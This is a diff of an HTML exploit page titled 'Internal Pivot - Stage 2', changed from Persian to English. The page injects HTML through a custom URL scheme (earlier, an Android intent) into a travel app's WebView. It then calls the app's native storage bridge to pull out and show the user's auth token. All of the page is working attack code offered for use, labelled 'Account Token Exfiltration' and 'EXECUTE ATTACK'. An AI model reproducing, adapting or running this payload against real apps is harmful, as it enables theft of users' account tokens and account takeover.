@@ -1,55 +1,54 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Internal Pivot Exploit</title>
+    <title>Internal Pivot - Stage 2</title>
     <style>
-        body { background: #161b22; color: #c9d1d9; font-family: sans-serif; text-align: center; padding: 40px; }
-        .btn { background: #238636; color: white; padding: 20px 30px; border-radius: 8px; font-weight: bold; font-size: 1.2rem; cursor: pointer; border: none; display: inline-block; }
-        .status { margin-top: 20px; color: #8b949e; font-family: monospace; }
+        body { background: #0d1117; color: #58a6ff; font-family: monospace; text-align: center; padding: 50px; }
+        .btn { background: #238636; color: white; padding: 20px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 20px; color: #8b949e; }
     </style>
 </head>
 <body>
-    <h1>مرحله دوم: شلیک اینتنت داخلی</h1>
-    <p>شما اکنون داخل مرورگر اپلیکیشن هستید. برای استخراج توکن کلیک کنید:</p>
+    <h1>INTERNAL PIVOT ACTIVE</h1>
+    <p>Target: Account Token Exfiltration</p>
 
-    <button class="btn" onclick="fireIntent()">استخراج نهایی توکن (Auth)</button>
-    <div class="status" id="stat">آماده شلیک...</div>
+    <button class="btn" onclick="execute()">EXECUTE ATTACK</button>
+    <div id="status">System Ready...</div>
 
     <script>
-        function fireIntent() {
-            document.getElementById('stat').innerText = "در حال ارسال اینتنت به لایه عمیق‌تر...";
+        function execute() {
+            document.getElementById('status').innerText = "Redirecting to Privileged Layer...";
             
-            // ۱. کد نهایی که قرار است توکن را چاپ کند
-            const finalPayload = `
+            // The final payload to be executed in the privileged container
+            const payload = `
             <html><body style="background:black;color:lime;padding:20px;font-family:monospace;">
-                <h2>[SUCCESS] PRIVILEGED ACCESS</h2>
-                <div id="out">Reading Auth Token...</div>
+                <h2>[+] BRIDGE ACCESS GRANTED</h2>
+                <div id="data">Extracting Auth Token...</div>
                 <script>
-                    window.__bridge_callback = function(data) {
+                    window.__bridge_callback = function(d) {
                         try {
-                            var decoded = atob(data);
-                            document.getElementById('out').innerHTML = "<h3>TOKEN FOUND:</h3>" + decoded;
-                        } catch(e) { document.getElementById('out').innerText = "Error: " + e.message; }
+                            var dec = atob(d);
+                            document.getElementById('data').innerHTML = "<h3>FOUND TOKEN:</h3>" + dec;
+                        } catch(e) { document.getElementById('data').innerText = "Error: " + e.message; }
                     };
-                    setTimeout(() => {
+                    setTimeout(function() {
                         if(window.IBUStorageV2_a) {
                             window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
                                 "bussiness": "common", 
                                 "key": "token",
-                                "callback_tagname": "Storage_token"
+                                "callback_tagname": "tok"
                             }));
-                        } else { document.getElementById('out').innerText = "Bridge Blocked!"; }
+                        }
                     }, 1000);
                 <\/script>
             </body></html>`;
 
-            // ۲. ساخت لینک Intent با پارامتر HTML_DATA_TO_LOAD
-            const encodedData = encodeURIComponent(finalPayload);
-            const intentURL = "intent:#Intent;scheme=ctripglobal;package=ctrip.english;S.HTML_DATA_TO_LOAD=" + encodedData + ";end";
-
-            // ۳. شلیک!
-            window.location.href = intentURL;
+            // Using the app's native scheme to avoid -1203 network errors
+            // We pass the payload into the HTML_DATA_TO_LOAD parameter
+            const finalUrl = "ctripglobal://webview?HTML_DATA_TO_LOAD=" + encodeURIComponent(payload);
+            
+            window.location.href = finalUrl;
         }
     </script>
 </body>
